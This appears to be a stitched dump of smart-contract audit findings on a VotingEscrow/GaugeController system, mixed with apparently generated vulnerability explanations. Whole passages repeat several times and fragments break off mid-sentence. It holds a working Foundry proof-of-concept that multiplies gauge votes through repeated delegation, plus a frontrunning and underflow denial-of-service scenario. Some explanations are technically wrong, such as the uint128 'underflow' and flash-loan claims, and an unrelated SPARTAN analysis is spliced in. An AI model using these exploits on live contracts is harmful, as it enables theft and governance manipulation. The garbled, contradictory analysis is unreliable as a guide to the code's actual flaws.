However, there is a check to see if `toLocked.end` has expired, which would be true since it would point to Alice's lock.\n```\nfunction delegate(address _addr) external nonReentrant {\n\tLockedBalance memory locked_ = locked[msg.sender];\n\t...\n\tLockedBalance memory fromLocked;\n\tLockedBalance memory toLocked;\n\tlocked_.delegatee = _addr;\n\tif (delegatee == msg.sender) {\n\t\t...\n\t// @audit this else if will execute\n\t} else if (_addr == msg.sender) {\n\t\t// Undelegate\n\t\tfromLocked = locked[delegatee]; // @audit Delegatee\n\t\ttoLocked = locked_; // @audit Alice's lock\n\t}\n\t...\n\trequire(toLocked.end > block.timestamp, \"Delegatee lock expired\");\n```\n\nThis is a test to be added into VoteEscrow.t.sol.

This can cause an integer underflow if the amount of CANTO tokens to be sent exceeds 128 bits, leading to incorrect calculations of rewards.\n\nHere's a step-by-step analysis of the vulnerability:\n\n1. The function withdraw() takes in no arguments and is marked as external and nonReentrant. This means that the function can only be called by an external user who has not recently called another external function, thus ensuring that the transaction is processed atomically.\n2. The first thing the function does is to retrieve the `locked_` memory variable associated with the calling address. This variable contains information about the current lock amount and delegated tokens for the calling address.\n3. Next, the function validates the inputs by checking if the lock amount is greater than 0 and if the lock has expired or not. If either of these conditions are false, the function terminates with an error message indicating that there is no lock.\n4. After validating the input, the function calculates the `amountToSend` variable using the `uint128` type from the `locked_` memory variable. This can cause an integer underflow if the amount of CANTO tokens to be sent exceeds 128 bits, leading to incorrect calculations of rewards.\n5.

When the user tries to re-delegate, either to someone else or themselves, the lock must not be expired. This is problematic because if a user forgets and lets their lock become expired, they cannot undelegate. This blocks withdrawal, which means their tokens are essentially locked forever.\n\n## Proof of Concept\nTo exit the system, Alice must call `withdraw()`. However, since they've delegated, they will not be able to.\n```solidity\nfunction withdraw() external nonReentrant {\n\t...\n\trequire(locked_.delegatee == msg.sender, \"Lock delegated\");\n\t...\n}\n```\nTo re-delegate to themselves (undelegate), they call `delegate(alice.address)`. However, there is a check to see if `toLocked.end` has expired, which would be true since it would point to Alice's lock.\n```\nfunction delegate(address _addr) external nonReentrant {\n\tLockedBalance memory locked_ = locked[msg.sender];\n\t...\n\tLockedBalance memory fromLocked;\n\tLockedBalance memory toLocked;\n\tlocked_.delegatee = _addr;\n\tif (delegatee == msg.sender) {\n\t\t...\n\t// @audit this else if will execute\n\t} else if (_addr == msg.sender) {\n\t\t// Undelegate\n\t\tfromLocked = locked[delegatee]; // @audit Delegatee\n\t\ttoLocked = locked_; // @audit Alice's lock\n\t}\n\t...\n\trequire(toLocked.end > block.timestamp, \"Delegatee lock expired\");\n```\n\nThis is a test to be added into VoteEscrow.t.sol.

The reason for this vulnerability is that the `withdraw` function uses a fixed-point number representation with 128 bits of precision, which can lead to rounding errors and overflows if not properly handled.\n\nThe function's implementation relies on the `LockedBalance` struct to store the lock amount, end timestamp, and delegatee address. The `withdraw` function first retrieves the locked balance for the sender using the `locked[msg.sender]` mapping. It then updates the lock by setting the `amount` field of the `newLocked` struct to 0, sets the `end` field to 0, and sets the `delegated` field to 0.\n\nThe vulnerability lies in the calculation of the amount to send back to the sender. The function calculates the amount to send by using the `uint256(uint128(locked_.amount))` expression. This expression converts the `amount` field of the `locked_` struct into a `uint128` type, which may cause loss of precision and can lead to integer underflow if the value exceeds 2^127 - 1.\n\nFor example, if the `amount` field is set to 2^129, it will be converted to a `uint128` type with a value of 0.

The `vote_for_gauge_weights` function is called by a user who has locked their tokens and wants to vote for gauge weights.\n2. The function first checks that the user's lock period does not expire before the next time period, which is determined by dividing the current block timestamp by the WEEK constant (which represents the duration of each voting period).\n3. If the user has an existing slope vote for the gauge address passed as a parameter, the function checks that the slope's end time is greater than the next time period. This is necessary because if the slope's end time is less than or equal to the current block timestamp, then the slope changes will not be recorded and the user will have an unfair advantage.\n4. The function then calculates the new slope vote for the gauge address based on the user's weight and the current block timestamp. This includes calculating a bias and slope value for the new vote, as well as updating the user's power used.\n5. Next, the function schedules recording of initial slope changes for the next time period by adding a bias and slope value to the gauge address's points weight and sum, respectively.

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

The user then wants to withdraw their tokens before the end of their lock period, but still maintain the same voting power.\n3. To do this, the user creates a new account that has a shorter lock period than the original account (e.g., 1 month).\n4.

After the shorter lock period ends, the user withdraws their tokens from the new account, leaving them with the same voting power as before.\n\nThis exploit allows the user to effectively circumvent the system incentives and potentially undesired consequences associated with holding tokens for a long duration while maintaining the same voting power.

It contains the following loop:\n```solidity\n            for (uint256 i; i < 500; ++i) {\n                if (t > block.timestamp) break;\n                t += WEEK;\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n                    pt.bias = 0;\n                    pt.slope = 0;\n                }\n                points_weight[_gauge_addr][t] = pt;\n                if (t > block.timestamp) time_weight[_gauge_addr] = t;\n            }\n```\n\nThere are two possible scenarios:\n- `pt.bias > d_bias`\n- `pt.bias <= d_bias`\n\nThe first scenario will always happen naturally, since `pt.bias` will be the total voting power allocated for some point and since slope is a sum of all users' slopes and slopes are calculated in such a way that `<SLOPE> * <TIME_TO_END_OF_STAKING_PERIOD> = <INITIAL_BIAS>`.\n\nHowever, it is possible to artificially change `points_weight[_gauge_addr][t].bias` by calling `change_gauge_weight` (which can be only called by the governance). It important to notice here, that `change_gauge_weight` **doesn't modify** `points_weight[_gauge_addr][t].slope`\n\n`change_gauge_weight` does permit to change the weight to a smaller number than its current value, so it's both perfectly legal and possible that governance does this at some point (it could be changing the weight to `0` or any other value smaller than the current one).\n\nThen, at some point when `_get_weight` is called, we will enter the `else` block because `pt.bias` will be less than the sum of all user's biases (since originally these values were equal, but `pt.bias` was lowered by the governance). It will set `pt.bias` and `pt.slope` to `0`.\n\nAfter some time, the governance may realise that the gauge's weight is `0`, but should be bigger and may change it to some bigger value.\n\nWe will have the situation where `points_weight[_gauge_addr][t].slope = 0` and `points_weight[_gauge_addr][t].bias > 0`.\n\nIf this happens and there is any nonzero `changes_weight[_gauge_addr]` not yet taken into account (for instance in the week after the governance update), then all the functions related to the gauge at `_gauge_addr` will not work.\n\nIt's because, the following functions:\n- `checkpoint_gauge`\n- `gauge_relative_weight_write`\n- `gauge_relative_weight`\n- `_change_gauge_weight`\n- `change_gauge_weight`\n- `vote_for_gauge_weights`\n- `remove_gauge`\n\ncall `_get_weight` at some point.\n\nLet's see what will happen in `_get_weight` when it's called:\n```solidity\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n```\n\nWe will enter the `if` statement, because `pt.bias` will be `> 0` and `pt.slope` will be `0` (or some small value, if users give their voting power to gauge in the meantime), since it was previously set to `0` in the `else` statement and wasn't touched when gauge's weight was changed by the governance. We will:\n- subtract `d_bias` from `pt.bias` which will succeed\n- attempt to subtract `changes_weight[_gauge_addr][t]` from `d_slope`\n\nHowever, there could be a user (or users) whose voting power allocation finishes at `t` for some `t` not yet handled. It means that `changes_weight[_gauge_addr][t] > 0` (and if `pt.slope` is not `0`, then `changes_weight[_gauge_addr][t]` still may be greater than it). \n\nIf this happens, then the integer underflow will happen in `pt.slope -= d_slope;`. It will now happen in **every** call to `_get_weight` and it won't be possible to recover, because:\n- `vote_for_gauge_weights` will revert\n- `change_gauge_weight` will revert\n\nas they call `_get_weight` internally. So, it won't be possible to modify `pt.slope` and `pt.bias` for any point in time, so the `revert` will always happen for that gauge. It won't even be possible to remove that gauge.\n\nSo, in short, the scenario is as follows:\n1. Users allocate their voting power to a gauge `X`.\n2. Governance at some point decreases the weight of `X`.\n3. Users withdraw their voting power as the time passes, and finally the weight of `X` drops to `0`.\n4. Governance realises this and increases weight of `X` since it wants to incentivise users to provide liquidity in `X`.\n5. Voting power delegation of some user(s) ends some time after that and `_get_weight` attempts to subtract `changes_weight[_gauge_addr][t]` from the current slope (which is either `0` or some small value) and it results in integer underflow.\n6. `X` is unusable and it's impossible to withdraw voting power from (so users cannot give their voting power somewhere else). The weight of `X` cannot be changed anymore and `X` cannot be even removed.\n\n**Note that it is also possible to frontrun the call to `change_gauge_weight` when the weight is set to a lower value** - user with a lot of capital can watch the mempool and if weight is lowered to some value `x`, he can give a voting power of `x` to that gauge. Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight = `0`. Then, governance will manually increase the weight to recover and DoS will happen as described. **So it is only needed that governance decreases gauge's weight at some point**.\n\n## Impact\nAs stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.\n\nIn order for this situation to succeed, governance has to decrease weight of some gauge, but I think it's very likely, because:\n1. `_get_weight` checks that `if (pt.bias > d_bias)` and it handles the opposite situation, so it is anticipated that it may genuinely happen.\n2. It is definitely possible to decrease gauge's weight and it's even possible to zero it out (as in the `remove_gauge`).\n3. The situation where `old_bias` is greater than `old_sum_bias + new_bias` is handled in `vote_for_gauge_weights`, but it may only happen when gauge's weight was decreased by the governance.\n4. The situation where `old_slope.slope` is greater than `old_sum_slope + new_slope.slope` is also handled there, but it may only happen if we enter the `else` statement in `_get_weight`.\n\nSo, it is predicted that gauge's weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so. Hence, I believe that this finding is of High severity, because although it requires governance to perform some action (decrease weight of some gauge), I believe that it's likely that governance decides to decrease weight, especially that it is anticipated in the code and edge cases are handled there (and they wouldn't be if we assumed that governance would never allowed them to happen).\n\n## Proof of Concept\nPlease run the test below. The test shows slightly simplified situation where governance just sets weight to `0` for `gauge1`, but as I've described above, it suffices that it's just changed to a smaller value and it may drop to `0` naturally as users withdraw their voting power.

It contains the following loop:\n```solidity\n            for (uint256 i; i < 500; ++i) {\n                if (t > block.timestamp) break;\n                t += WEEK;\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n                    pt.bias = 0;\n                    pt.slope = 0;\n                }\n                points_weight[_gauge_addr][t] = pt;\n                if (t > block.timestamp) time_weight[_gauge_addr] = t;\n            }\n```\n\nThere are two possible scenarios:\n- `pt.bias > d_bias`\n- `pt.bias <= d_bias`\n\nThe first scenario will always happen naturally, since `pt.bias` will be the total voting power allocated for some point and since slope is a sum of all users' slopes and slopes are calculated in such a way that `<SLOPE> * <TIME_TO_END_OF_STAKING_PERIOD> = <INITIAL_BIAS>`.\n\nHowever, it is possible to artificially change `points_weight[_gauge_addr][t].bias` by calling `change_gauge_weight` (which can be only called by the governance). It important to notice here, that `change_gauge_weight` **doesn't modify** `points_weight[_gauge_addr][t].slope`\n\n`change_gauge_weight` does permit to change the weight to a smaller number than its current value, so it's both perfectly legal and possible that governance does this at some point (it could be changing the weight to `0` or any other value smaller than the current one).\n\nThen, at some point when `_get_weight` is called, we will enter the `else` block because `pt.bias` will be less than the sum of all user's biases (since originally these values were equal, but `pt.bias` was lowered by the governance). It will set `pt.bias` and `pt.slope` to `0`.\n\nAfter some time, the governance may realise that the gauge's weight is `0`, but should be bigger and may change it to some bigger value.\n\nWe will have the situation where `points_weight[_gauge_addr][t].slope = 0` and `points_weight[_gauge_addr][t].bias > 0`.\n\nIf this happens and there is any nonzero `changes_weight[_gauge_addr]` not yet taken into account (for instance in the week after the governance update), then all the functions related to the gauge at `_gauge_addr` will not work.\n\nIt's because, the following functions:\n- `checkpoint_gauge`\n- `gauge_relative_weight_write`\n- `gauge_relative_weight`\n- `_change_gauge_weight`\n- `change_gauge_weight`\n- `vote_for_gauge_weights`\n- `remove_gauge`\n\ncall `_get_weight` at some point.\n\nLet's see what will happen in `_get_weight` when it's called:\n```solidity\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n```\n\nWe will enter the `if` statement, because `pt.bias` will be `> 0` and `pt.slope` will be `0` (or some small value, if users give their voting power to gauge in the meantime), since it was previously set to `0` in the `else` statement and wasn't touched when gauge's weight was changed by the governance. We will:\n- subtract `d_bias` from `pt.bias` which will succeed\n- attempt to subtract `changes_weight[_gauge_addr][t]` from `d_slope`\n\nHowever, there could be a user (or users) whose voting power allocation finishes at `t` for some `t` not yet handled. It means that `changes_weight[_gauge_addr][t] > 0` (and if `pt.slope` is not `0`, then `changes_weight[_gauge_addr][t]` still may be greater than it). \n\nIf this happens, then the integer underflow will happen in `pt.slope -= d_slope;`. It will now happen in **every** call to `_get_weight` and it won't be possible to recover, because:\n- `vote_for_gauge_weights` will revert\n- `change_gauge_weight` will revert\n\nas they call `_get_weight` internally. So, it won't be possible to modify `pt.slope` and `pt.bias` for any point in time, so the `revert` will always happen for that gauge. It won't even be possible to remove that gauge.\n\nSo, in short, the scenario is as follows:\n1. Users allocate their voting power to a gauge `X`.\n2. Governance at some point decreases the weight of `X`.\n3. Users withdraw their voting power as the time passes, and finally the weight of `X` drops to `0`.\n4. Governance realises this and increases weight of `X` since it wants to incentivise users to provide liquidity in `X`.\n5. Voting power delegation of some user(s) ends some time after that and `_get_weight` attempts to subtract `changes_weight[_gauge_addr][t]` from the current slope (which is either `0` or some small value) and it results in integer underflow.\n6. `X` is unusable and it's impossible to withdraw voting power from (so users cannot give their voting power somewhere else). The weight of `X` cannot be changed anymore and `X` cannot be even removed.\n\n**Note that it is also possible to frontrun the call to `change_gauge_weight` when the weight is set to a lower value** - user with a lot of capital can watch the mempool and if weight is lowered to some value `x`, he can give a voting power of `x` to that gauge. Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight = `0`. Then, governance will manually increase the weight to recover and DoS will happen as described. **So it is only needed that governance decreases gauge's weight at some point**.\n\n## Impact\nAs stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.\n\nIn order for this situation to succeed, governance has to decrease weight of some gauge, but I think it's very likely, because:\n1. `_get_weight` checks that `if (pt.bias > d_bias)` and it handles the opposite situation, so it is anticipated that it may genuinely happen.\n2. It is definitely possible to decrease gauge's weight and it's even possible to zero it out (as in the `remove_gauge`).\n3. The situation where `old_bias` is greater than `old_sum_bias + new_bias` is handled in `vote_for_gauge_weights`, but it may only happen when gauge's weight was decreased by the governance.\n4. The situation where `old_slope.slope` is greater than `old_sum_slope + new_slope.slope` is also handled there, but it may only happen if we enter the `else` statement in `_get_weight`.\n\nSo, it is predicted that gauge's weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so. Hence, I believe that this finding is of High severity, because although it requires governance to perform some action (decrease weight of some gauge), I believe that it's likely that governance decides to decrease weight, especially that it is anticipated in the code and edge cases are handled there (and they wouldn't be if we assumed that governance would never allowed them to happen).\n\n## Proof of Concept\nPlease run the test below. The test shows slightly simplified situation where governance just sets weight to `0` for `gauge1`, but as I've described above, it suffices that it's just changed to a smaller value and it may drop to `0` naturally as users withdraw their voting power.

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

This can be achieved by adding a check in the `vote_for_gauge_weights` function that verifies whether rewards have been queued for the current cycle before adding or removing gauges.\n\nHere is an example of how the code could be modified:\n```scss\nfunction vote_for_gauge_weights(address _gauge_addr, uint256 _user_weight) external {\n    require(_user_weight >= 0 && _user_weight <= 10_000, \"Invalid user weight\");\n    require(isValidGauge[_gauge_addr], \"Invalid gauge address\");\n    VotingEscrow ve = votingEscrow;\n    (\n        ,\n        /*int128 bias*/\n        int128 slope_, /*uint256 ts*/\n    \n    ) = ve.getLastUserPoint(msg.sender);\n    require(slope_ >= 0, \"Invalid slope\");\n    uint256 slope = uint256(uint128(slope_));\n    uint256 lock_end = ve.lockEnd(msg.sender);\n    uint256 next_time = ((block.timestamp + WEEK",

The attack involves deploying multiple accounts and using them to vote for different gauges with varying lock times, in order to manipulate the voting power of the main account without committing tokens.\n\nThe vulnerability arises from the fact that the contract allows users to extend their lock period and vote on new gauges while retaining their existing votes. This can be done by calling the `vote_for_gauge_weights` function with a new gauge address and a new user weight, which will update the voting power used by the user and add a new slope change to the gauge's weights. However, if the lock period has not yet expired, the contract will only update the existing slope changes for that gauge, rather than creating a new one.\n\nTo exploit this vulnerability, an attacker would need to create multiple accounts with different lock times and vote on different gauges in a way that maximizes their own voting power while minimizing the impact of their votes on other users. For example, they could deploy an account with a long lock time and vote for a gauge with a high weight, then quickly switch to another account with a shorter lock time and vote for a gauge with a low weight.

The attack allows a user to circumvent the system's incentives and undermine the proper functioning of the protocol by deploying multiple accounts while locking their tokens for different durations, delegating the locked tokens, and extending the lock period to maximize their voting power.\n\nThe vulnerability is caused by the fact that the smart contract code does not properly update the user's vote weights when a new slope is recorded.

The vulnerability arises from the fact that the user's pool share weight is directly proportional to the number of pooled tokens they own, divided by the total supply of LP tokens, and multiplied by the base amount (number of SPARTAN tokens in the pool). This means that the user's pool share weight is determined based on the number of SPARTAN tokens in the pool, which can be manipulated by flash loans.\n\nTo exploit this vulnerability, an attacker can first add liquidity to the pool, obtaining LP tokens in return, and then swap a large amount of an external token (e.g., WBNB) for SPARTAN, increasing the base amount of SPARTAN tokens in the pool. The attacker subsequently increases their weight in the DaoVault or BondVault by depositing their LP tokens in the pool, resulting in an artificially increased pool share weight that grants them undue influence in voting proposals and potentially higher rewards. Finally, the attacker swaps back SPARTAN to the external token (e.g., WBNB), losing only the trading fees associated with these transactions.\n\nThe reason for this vulnerability is that the smart contract code does not impose a time delay between updating a user's weight in the DaoVault or BondVault and allowing the new weight to take effect. This means that any flash loan-related transactions might not be guaranteed to persist beyond the imposed delay, potentially leaving users with manipulated pool share weights.\n\nTherefore, I would recommend implementing a time delay between updating a user's weight in the DaoVault or BondVault and allowing the new weight to take effect as a mitigation strategy to prevent this vulnerability.",

Type of vulnerability: Flash Loan Manipulation in Pool Share Weight Calculation\n3. Reason for answer: The code allows users to vote on gauge weights by depositing their LP tokens and specifying a weight (between 0 and 10,000). However, the voting process is not properly timed. The code updates the user's weight immediately after the vote, without waiting until the next time period (which is calculated based on the block timestamp + one week). This means that an attacker could exploit this vulnerability by artificially increasing their pool share weight by depositing large amounts of LP tokens and voting for a short period of time before withdrawing them.

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

It contains the following loop:\n```solidity\n            for (uint256 i; i < 500; ++i) {\n                if (t > block.timestamp) break;\n                t += WEEK;\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n                    pt.bias = 0;\n                    pt.slope = 0;\n                }\n                points_weight[_gauge_addr][t] = pt;\n                if (t > block.timestamp) time_weight[_gauge_addr] = t;\n            }\n```\n\nThere are two possible scenarios:\n- `pt.bias > d_bias`\n- `pt.bias <= d_bias`\n\nThe first scenario will always happen naturally, since `pt.bias` will be the total voting power allocated for some point and since slope is a sum of all users' slopes and slopes are calculated in such a way that `<SLOPE> * <TIME_TO_END_OF_STAKING_PERIOD> = <INITIAL_BIAS>`.\n\nHowever, it is possible to artificially change `points_weight[_gauge_addr][t].bias` by calling `change_gauge_weight` (which can be only called by the governance). It important to notice here, that `change_gauge_weight` **doesn't modify** `points_weight[_gauge_addr][t].slope`\n\n`change_gauge_weight` does permit to change the weight to a smaller number than its current value, so it's both perfectly legal and possible that governance does this at some point (it could be changing the weight to `0` or any other value smaller than the current one).\n\nThen, at some point when `_get_weight` is called, we will enter the `else` block because `pt.bias` will be less than the sum of all user's biases (since originally these values were equal, but `pt.bias` was lowered by the governance). It will set `pt.bias` and `pt.slope` to `0`.\n\nAfter some time, the governance may realise that the gauge's weight is `0`, but should be bigger and may change it to some bigger value.\n\nWe will have the situation where `points_weight[_gauge_addr][t].slope = 0` and `points_weight[_gauge_addr][t].bias > 0`.\n\nIf this happens and there is any nonzero `changes_weight[_gauge_addr]` not yet taken into account (for instance in the week after the governance update), then all the functions related to the gauge at `_gauge_addr` will not work.\n\nIt's because, the following functions:\n- `checkpoint_gauge`\n- `gauge_relative_weight_write`\n- `gauge_relative_weight`\n- `_change_gauge_weight`\n- `change_gauge_weight`\n- `vote_for_gauge_weights`\n- `remove_gauge`\n\ncall `_get_weight` at some point.\n\nLet's see what will happen in `_get_weight` when it's called:\n```solidity\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n```\n\nWe will enter the `if` statement, because `pt.bias` will be `> 0` and `pt.slope` will be `0` (or some small value, if users give their voting power to gauge in the meantime), since it was previously set to `0` in the `else` statement and wasn't touched when gauge's weight was changed by the governance. We will:\n- subtract `d_bias` from `pt.bias` which will succeed\n- attempt to subtract `changes_weight[_gauge_addr][t]` from `d_slope`\n\nHowever, there could be a user (or users) whose voting power allocation finishes at `t` for some `t` not yet handled. It means that `changes_weight[_gauge_addr][t] > 0` (and if `pt.slope` is not `0`, then `changes_weight[_gauge_addr][t]` still may be greater than it). \n\nIf this happens, then the integer underflow will happen in `pt.slope -= d_slope;`. It will now happen in **every** call to `_get_weight` and it won't be possible to recover, because:\n- `vote_for_gauge_weights` will revert\n- `change_gauge_weight` will revert\n\nas they call `_get_weight` internally. So, it won't be possible to modify `pt.slope` and `pt.bias` for any point in time, so the `revert` will always happen for that gauge. It won't even be possible to remove that gauge.\n\nSo, in short, the scenario is as follows:\n1. Users allocate their voting power to a gauge `X`.\n2. Governance at some point decreases the weight of `X`.\n3. Users withdraw their voting power as the time passes, and finally the weight of `X` drops to `0`.\n4. Governance realises this and increases weight of `X` since it wants to 